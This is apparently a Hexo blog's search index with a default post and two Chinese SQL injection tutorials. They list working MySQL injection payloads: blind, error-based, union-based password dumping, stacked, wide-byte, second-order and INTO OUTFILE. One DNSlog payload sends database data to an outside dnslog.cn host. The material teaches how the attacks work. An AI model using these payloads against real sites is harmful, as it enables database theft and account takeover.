<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/12/04/hello-world/"/>
      <url>/2023/12/04/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2023/11/30/12.SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/"/>
      <url>/2023/11/30/12.SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h2 id="1-SQL简介"><a href="#1-SQL简介" class="headerlink" title="1.SQL简介"></a>1.SQL简介</h2><ul><li>SQL 指结构化查询语言</li><li>SQL 使我们有能力访问数据库</li><li>SQL 是一种 ANSI 的标准计算机语言</li></ul><p>注：ANSI，美国国家标准化组织</p><h2 id="2-注入的形成"><a href="#2-注入的形成" class="headerlink" title="2.注入的形成"></a>2.注入的形成</h2><p>目前的web大多是前后端分离，在固定前端页面上，通过不同参数去调用数据中的内容，如果这个过程中我们拼接了恶意语句并且没有被过滤掉，那么数据库很有可能会执行我们的恶意语句，从而导致攻击者可以通过拼接恶意语句来达到操作数据库，获得数据库的敏感信息，产生极大的危害</p><p>例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &#x27;select * from test where id=&#x27;.$_GET[&#x27;id&#x27;];</span><br></pre></td></tr></table></figure><p>假设这里没有任何的过滤，那么当我们输入2的时候语句为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where  id=2</span><br></pre></td></tr></table></figure><p>当我们输入2 and 1&#x3D;1的时候，发现页面页面正常回显，输入2 and 1&#x3D;2的时候页面回显不正常</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from test where  id=2 and 1=1   正常</span><br><span class="line">select * from test where  id=2 and 1=2   回显不正常</span><br></pre></td></tr></table></figure><p>很明显sql的查询语句把我们拼接的代码带入执行了，黑客可以通过拼接别的语句获取更多的信息，从而完成一次注入攻击</p><h2 id="3-SQL注入的类型"><a href="#3-SQL注入的类型" class="headerlink" title="3.SQL注入的类型"></a>3.SQL注入的类型</h2><p><strong>3.1注入点类型分类</strong></p><p><strong>3.1.1数字型注入</strong><br>当我们访问页面时经常会出现http:xxx.admin.com?id&#x3D;1这种形式的url，这个时候我们输入and 1&#x3D;1与and 1&#x3D;2,进行判定看是否会出现and 1&#x3D;1回显正常，and 1&#x3D;2回显不正常的情况。如果出现了我们一般就认为这里存在注入，并且是数字型注入。如果没有出现那么并不能排查这里没有注入，只是排除这里不存在数字型的注入。</p><p>数字型注入还可以利用数字的增减操作进行布尔盲注，避免使用and，or 等敏感词</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=3-1</span><br><span class="line">id=1%2b1</span><br></pre></td></tr></table></figure><p><strong>3.1.2字符型</strong><br>http:xxx.admin.com?id&#x3D;1同样的url，我们输入 ‘ 看是否会出现报错的现象。如果存在我们可以进一步的闭合我们的语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table where id=&#x27;1&#x27;</span><br></pre></td></tr></table></figure><p>加入’ and 1&#x3D;1 #</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table where id=&#x27;1&#x27; and 1=1 # &#x27;</span><br></pre></td></tr></table></figure><p><strong>3.1.3搜索型注入</strong><br>搜索框内会使用这样形式的sql语句进行查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT*from test where names like &#x27;%要查询的关键字%&#x27;</span><br></pre></td></tr></table></figure><p>我们写入类型这样的语句进行闭合 %’ and 1&#x3D;1 #</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT*from test where names like &#x27;%要查询的关键字%&#x27; and 1=1 # % &#x27;</span><br></pre></td></tr></table></figure><p><strong>3.2按照数据提交方式</strong></p><p><strong>3.2.1get注入</strong><br>数据以get的方式进行提交。注入点一般在get提交的url后，可以通过bp抓包进行查找</p><p><strong>3.2.2post注入</strong><br>数据以post的方式进行提交。注入点一般表单的填写处，如资料的填写等地方较为常见，可以通过bp抓包进行查找</p><p><strong>3.2.3http头部注入</strong><br>user-agent:判定用户使用的操作系统，以及使用的浏览器的版本<br>cookie:判定用户的身份，进行session跟踪可以存储在用户本地终端上的数据，简单理解为用户的一张身份辨别卡<br>x-forwarded-for:是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段<br>client-ip: 数据库保存客户端IP的参数<br>rerferer:浏览器向web端表明自己从哪个连接而来<br>host:客户端指定自己想访问的WEB服务器的域名&#x2F;IP 地址和端口号</p><p><strong>3.3按照执行效果</strong></p><p><strong>3.3.1盲注</strong></p><ul><li>特点：盲注在于无法构造出回显位时使用</li><li>优点：优点是适配绝大部分注入点</li><li>缺点：注入繁琐，费时费力，高频率对服务器发起访问也容易被ban。</li><li>分类：布尔盲注，时间盲注，dnslog盲注</li></ul><p><strong>3.3.1.1布尔盲注</strong><br>特点:以页面回显的内容的不同作为判定依据。</p><p>id&#x3D;1 and 1&#x3D;1</p><p>id&#x3D;1 and 1&#x3D;2</p><p>id&#x3D;1 and user()&#x3D;‘root@localhost’</p><p>id&#x3D;1 and substr((select user()),1,1)&#x3D; ‘r’</p><p>id&#x3D;1 and ascii(substr((select<br>user()),1,1))&#x3D; 114</p><p><strong>3.3.1.2时间盲注</strong><br>时间盲注，以回显的时间长短作为判断依旧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and sleep(2)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and if((substr((select user()),1,1)=&#x27;r&#x27;),sleep(2),1)</span><br></pre></td></tr></table></figure><p><strong>3.3.1.3dnslog盲注</strong></p><ul><li>特点:必须windows系统，必须root权限，必须secure_file_priv为空</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=2 and 1=(selectload_file(concat(&#x27;\\\\&#x27;,hex(database()),&#x27;.pk4qft.dnslog.cn\\test&#x27;)))</span><br></pre></td></tr></table></figure><p><strong>3.3.2报错注入</strong></p><ul><li>特点：经过精心构造的函数，让函数处理user()等不合规定的数据，引发mysql报错。最常用的是updatexml()</li><li>优点：报错注入优点是注入位置广泛，几乎任何和数据库有关的操作经过sql拼接都可以产生报错注入，有回显位，获取数据方便。</li><li>缺点：缺点是必须开启错误提示，mysqli_error()</li></ul><p>关键函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">1.floor</span><br><span class="line">id=1 and </span><br><span class="line">(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group</span><br><span class="line">by x)a);</span><br><span class="line"></span><br><span class="line">2.extractvalue()</span><br><span class="line"></span><br><span class="line">id=1 and</span><br><span class="line">(extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line"></span><br><span class="line">3.updatexml()</span><br><span class="line"></span><br><span class="line">id=1 and (updatexml(1,concat(0x7e,(select</span><br><span class="line">user()),0x7e),1));</span><br><span class="line"></span><br><span class="line">4.geometrycollection()</span><br><span class="line"></span><br><span class="line">id=1 and geometrycollection((select *</span><br><span class="line">from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">5.multipoint()</span><br><span class="line"></span><br><span class="line">id=1 and multipoint((select * from(select</span><br><span class="line">* from(select user())a)b));</span><br><span class="line"></span><br><span class="line">6.polygon()</span><br><span class="line"></span><br><span class="line">id=1 and polygon((select * from(select *</span><br><span class="line">from(select user())a)b));</span><br><span class="line"></span><br><span class="line">7.multipolygon()</span><br><span class="line"></span><br><span class="line">id=1 and multipolygon((select *</span><br><span class="line">from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">8.linestring()</span><br><span class="line"></span><br><span class="line">id=1 and linestring((select * from(select</span><br><span class="line">* from(select user())a)b));</span><br><span class="line"></span><br><span class="line">9.multilinestring()</span><br><span class="line"></span><br><span class="line">id=1 and multilinestring((select *</span><br><span class="line">from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">10.exp()</span><br><span class="line"></span><br><span class="line">id=1 and exp(~(select * from(select</span><br><span class="line">user())a));</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>3.3.3联合查询</strong><br>特点：联合注入使用了union select联合查询，常用来拼接在where后面，并且通过报错的方式显示显位<br>优势：联合注入通过显位的方式可以快速的爆出数据<br>缺点：缺点是只能用在select最后处，后面如果还有sql语句就必须注释掉。并且必须用到union和select两个关键字，并且这两个关键字也很容易被拦截</p><p>关键函数：union select、group_concat</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/news.php?id=1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/news.php?id=1 order by 4</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/news.php?id=-1 union</span><br><span class="line">select 1,2,3,4</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/news.php?id=-1 union</span><br><span class="line">select user(),2,3,4</span><br></pre></td></tr></table></figure><p>sql语句为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id = $id;</span><br></pre></td></tr></table></figure><p>确定列数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id = 1 order by</span><br><span class="line">4</span><br></pre></td></tr></table></figure><p>显示回显位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id = -1 union</span><br><span class="line">select 1,2,3,4</span><br></pre></td></tr></table></figure><p>通过回显位爆出内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id = -1 union</span><br><span class="line">select user(),2,3,4</span><br></pre></td></tr></table></figure><p>进而爆库，表，列，值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id = -1 union</span><br><span class="line">select database(),2,3,4</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id =</span><br><span class="line">-1 union select group_concat(schema_name),2,3,4  from information_schema.schemata</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id =</span><br><span class="line">-1 union select group_concat(table_name),2,3,4 from information_schema.tables</span><br><span class="line">where table_schema=database()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id =</span><br><span class="line">-1 union select group_concat(table_name),2,3,4 from information_schema.tables</span><br><span class="line">where table_schema=database()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id =</span><br><span class="line">-1 union select group_concat(column_name),2,3,4 from information_schema.columns</span><br><span class="line">where table_name= &#x27;user&#x27; and table_schema=database()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id = -1 union</span><br><span class="line">select group_concat(password),2,3,4 from user</span><br></pre></td></tr></table></figure><p><strong>3.3.4堆叠注入</strong></p><p>特点:</p><ol><li>堆叠注入在mysql数据库中并不常见，常见于mssql数据库，mssql数据库是默认堆叠注入的</li><li>堆叠注入必须要用到mysqli_multi_query()函数，可以使用分号分隔来执行多个语句，相当于可直连数据库</li><li>堆叠注入的危害性非常的大，通常sql注入有诸多限制，比如只能查不能增删改，不能更改数据库设置，而堆叠注入相当于获取了数据库密码进行直连，直接操作数据库</li></ol><p>语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1;select user();</span><br></pre></td></tr></table></figure><p><strong>3.3.5宽字节注入</strong><br>特点：</p><ul><li>字符注入的时候我们需要逃逸单引号，但是php提供了魔术引号开关magic_quotes_gpc和addslashes()，iconv()函数作为防御，特点是自动给传入的参数如单引号，双引号，反斜杠，%00前面加一个反斜杠，进行转义，避免单引号进行逃逸</li><li>如果数据库是GBK格式而非默认的UTF-8格式，则我们利用两个url编码是一个汉字的特点，组合一个汉字从而解决”\“问题，完成单引号的逃逸</li></ul><p>语句</p><p>url编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">’   %27</span><br><span class="line">\   %5c</span><br><span class="line">%bf \&#x27;=%bf%5c%27=縗&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>闭合过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id=&#x27;$id&#x27;;</span><br><span class="line"></span><br><span class="line">Select * from user where id=&#x27;1\&#x27;and 1=\&#x27;1&#x27;;</span><br><span class="line"></span><br><span class="line">Select * from user where id=&#x27;1縗&#x27;and 1=縗&#x27;1&#x27; ;</span><br></pre></td></tr></table></figure><p>注:%bf并不是唯一的一个字符，应该是%81-%FE之间的任意一个都可以,只要是可以跟我们的反斜杠%5c能够组成汉字，完成单引号逃逸的都是可以使用的</p><p><strong>3.3.6二次注入</strong><br>特点：sql语句的变量并不是直接传入的变量，而是通过其它的方式保存到了数据库，形成二次注入<br>例子：</p><p>比如注册一个用户名为 admin’ #的用户，注册时并无SQL注入，修改密码时的SQL语句为。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update user set password=&#x27;$password&#x27; where username=&#x27;admin&#x27; #&#x27;</span><br></pre></td></tr></table></figure><p>导致越权修改了admin的密码。</p><p><strong>3.4注入拼接位置</strong><br><strong>3.4.1where注入</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id = $id and data &lt; &#x27;$data&#x27;;</span><br><span class="line"></span><br><span class="line">select * from news where id = 1 and 1=1 and data &lt; &#x27;test&#x27;and 1=&#x27;1&#x27;;</span><br><span class="line"></span><br><span class="line">delete from user where id =$id;</span><br><span class="line"></span><br><span class="line">delete from user where id =1 and 1=1;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>3.4.2order by注入</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select * from user order by $id;</span><br><span class="line"></span><br><span class="line">select * from user order by 1 desc/asc</span><br><span class="line"></span><br><span class="line">select * from user order by sleep(2);</span><br><span class="line"></span><br><span class="line">select * from user order by rand(1=2);</span><br><span class="line"></span><br><span class="line">select * from user order by updatexml(1,concat(0x7e,(select user()),0x7e),1);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>3.4.3limit注入</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select * from user limit $limit, $size</span><br><span class="line"></span><br><span class="line">select * from user limit 1 into @,@,@,@;</span><br><span class="line"></span><br><span class="line">select * from user limit 1 into outfile &#x27;D://1.txt&#x27;;</span><br><span class="line"></span><br><span class="line">select * from user limit 1 procedure analyse(extractvalue(rand(),concat(0x3a,user())),1);</span><br><span class="line"></span><br><span class="line">select * from user limit 1 procedure analyse(extractvalue(rand(),concat(0x3a,(IF(mid(user(),1,1)</span><br><span class="line">LIKE &#x27;r&#x27;, BENCHMARK(5000000,SHA1(1)),1)))),1);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>3.4.4values注入</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">insert into `test`.`log`(`log`) VALUES(&#x27;$log&#x27;);</span><br><span class="line"></span><br><span class="line">insert into `test`.`log`(`log`) VALUES(&#x27;testsetset&#x27;or sleep(5)) # &#x27;);</span><br><span class="line"></span><br><span class="line">insert into `test`.`log`(`log`) VALUES(&#x27;testsetset&#x27; and extractvalue(1,concat(0x7e,(select @@version),0x7e))) # &#x27;)</span><br><span class="line"></span><br><span class="line">insert into `test`.`log`(`log`) VALUES(&#x27;1&#x27;+if((1=1),sleep(2),1)) # &#x27;)</span><br></pre></td></tr></table></figure><p>参考：<br>limit实例：<a href="https://blog.csdn.net/tian/_ci/article/details/85700929">https://blog.csdn.net/tian\_ci/article/details/85700929</a><br>substr实例：<a href="https://www.runoob.com/php/func-string-substr.html">https://www.runoob.com/php/func-string-substr.html</a><br>count函数：<a href="https://www.runoob.com/sql/sql-func-count.html">https://www.runoob.com/sql/sql-func-count.html</a><br>xtype:<a href="https://blog.csdn.net/qq/_39654116/article/details/105438947">https://blog.csdn.net/qq\_39654116/article/details/105438947</a></p>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> 数据库 - 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入学习</title>
      <link href="/2023/11/30/1.SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/11/30/1.SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.loongten.com/2019/12/28/pentest-learn-sql/#">SQL注入学习</a></p><h1 id="SQL注入学习"><a href="#SQL注入学习" class="headerlink" title="SQL注入学习"></a>SQL注入学习</h1><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>sql注入就是一种通过操作输入来修改后台操作语句达到执行恶意sql语句来进行攻击的技术。</p><p>程序对输入的文字没有进行过滤，而直接拿去拼接sql语句，我们可以通过截断sql语句来运行我们的的语句进行攻击实现比如脱裤等。</p><h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><h2 id="按变量类型分"><a href="#按变量类型分" class="headerlink" title="按变量类型分"></a>按变量类型分</h2><ul><li><p>数字型</p><blockquote><p>许多网页链接有类似的结构 <a href="http://xxx.com/users.php?id=1">http://xxx.com/users.php?id=1</a> 基于此种形式的注入，注入点id为数字，一般被叫做数字型注入点，通过这种形式查询出后台数据库信息返回前台展示，可以构造类似以下的sql语句进行爆破：select *** from 表名 where id&#x3D;1 and 1&#x3D;1</p></blockquote></li><li><p>字符型</p><blockquote><p>网页链接有类似的结构 <a href="http://xxx.com/users.php?name=admin">http://xxx.com/users.php?name=admin</a> 这种形式，注入点name为字符串，被称为字符型注入，可以用：select *** from 表名 where name&#x3D;’admin’ and 1&#x3D;1</p></blockquote></li><li><p>搜索型</p><blockquote><p>主要是指在数据搜索时没有过滤搜索参数，一般在链接地址中有 “keyword&#x3D;“关键字””，注入点提交的是sql语句，select * from 表名 where 字段 like ‘%关键字%’ and ‘%1%’&#x3D;’%1%’</p></blockquote><h2 id="按HTTP提交方式分"><a href="#按HTTP提交方式分" class="headerlink" title="按HTTP提交方式分"></a>按HTTP提交方式分</h2></li><li><p>GET注入</p><blockquote><p>通过GET请求，比如?id&#x3D;’and 1&#x3D;1</p></blockquote></li><li><p>POST注入</p><blockquote><p>可以分为以下这三种，xml存在注入的可能性非常大</p></blockquote><ol><li>form</li><li>json</li><li>xml</li></ol></li><li><p>Cookie注入</p><blockquote><p>通过Cookie注入</p></blockquote></li></ul><h2 id="按注入方式分"><a href="#按注入方式分" class="headerlink" title="按注入方式分"></a>按注入方式分</h2><ul><li><p>报错注入</p><blockquote><p>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p></blockquote></li><li><p>盲注</p><ul><li><p>布尔盲注</p><blockquote><p>根据页面返回判断条件真假注入 比如 and 1&#x3D;1</p></blockquote></li><li><p>时间盲注</p><blockquote><p>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断</p></blockquote></li></ul></li><li><p>union注入</p><blockquote><p>可以使用union情况下注入</p></blockquote></li></ul><h2 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h2><ul><li>宽字节注入</li></ul><h1 id="识别后台数据库"><a href="#识别后台数据库" class="headerlink" title="识别后台数据库"></a>识别后台数据库</h1><p>一般情况下来说，可以根据操作系统和web语言推测出常用的</p><h2 id="根据操作系统平台"><a href="#根据操作系统平台" class="headerlink" title="根据操作系统平台"></a>根据操作系统平台</h2><ul><li>sql server：Windows（IIS)</li><li>MySQL：Apache</li></ul><h2 id="根据web语言"><a href="#根据web语言" class="headerlink" title="根据web语言"></a>根据web语言</h2><ul><li>Microsoft SQL Server： ASP 和 .Net</li><li>MySQL：PHP</li><li>Oracle&#x2F;MySQL：java</li></ul><h1 id="数据库区别"><a href="#数据库区别" class="headerlink" title="数据库区别"></a>数据库区别</h1><p>每个数据库都有不同的区别，暂时列出这些</p><h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><h3 id="MySQL-5-0以上和MySQL-5-0以下版本的区别"><a href="#MySQL-5-0以上和MySQL-5-0以下版本的区别" class="headerlink" title="MySQL 5.0以上和MySQL 5.0以下版本的区别"></a>MySQL 5.0以上和MySQL 5.0以下版本的区别</h3><p>MySQL 5.0以上版本存在一个存储着数据库信息的信息数据库–INFORMATION_SCHEMA ，其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。 而5.0以下没有。</p><h4 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h4><p>系统数据库，记录当前数据库的数据库，表，列，用户权限等信息</p><p>大致列下用得到的</p><table><thead><tr><th>列名</th><th>数据类型</th><th>描述</th></tr></thead><tbody><tr><td>TABLE_CATALOG</td><td>nvarchar(128)</td><td>表限定符</td></tr><tr><td>TABLE_SCHEMA</td><td>nvarchar(128)</td><td>表所有者</td></tr><tr><td>TABLE_NAME</td><td>nvarchar(128)</td><td>表名</td></tr><tr><td>COLUMN_NAME</td><td>nvarchar(128)</td><td>列名</td></tr><tr><td>ORDINAL_POSITION</td><td>smallint</td><td>列标识号</td></tr><tr><td>COLUMN_DEFAULT</td><td>nvarchar(4000)</td><td>列的默认值</td></tr><tr><td>IS_NULLABLE</td><td>varchar(3)</td><td>列的为空性。如果列允许 NULL，那么该列返回 YES。否则，返回 NO。</td></tr></tbody></table><p>首先介绍一下的是爆库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SCHEMA_NAME from information_schema.SCHEMATA limit 5,1</span><br></pre></td></tr></table></figure><p>5,1表示从第1个开始，数到第5个</p><p>然后就是爆表了。<br><code>select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=0×6D656D626572 limit 5,1</code></p><p>TABLE_SCHEMA&#x3D;后面是库名的16进制</p><p>再来爆字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=0×61646D5F75736572 limit 5,1</span><br></pre></td></tr></table></figure><p>所有数据都是从information_schema.columns这个表里获取，因为从information_schema这个库我们可以看到，从information_schema.columns这个表里，我们可以查到所有的信息，因为它在里面，table_schema、 table_name、column_name这个三个列都有，所以我们可以直接通过这个表，查出我们需要的所有信息，就省了换表这一步了，进一步提升速度</p><p>然后下面也会介绍手工注入</p><h4 id="SCHEMATA"><a href="#SCHEMATA" class="headerlink" title="SCHEMATA"></a>SCHEMATA</h4><p>储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等</p><h4 id="TABLES"><a href="#TABLES" class="headerlink" title="TABLES"></a>TABLES</h4><p>储存mysql中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等</p><h4 id="COLUMNS"><a href="#COLUMNS" class="headerlink" title="COLUMNS"></a>COLUMNS</h4><p>储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等</p><h1 id="手工注入"><a href="#手工注入" 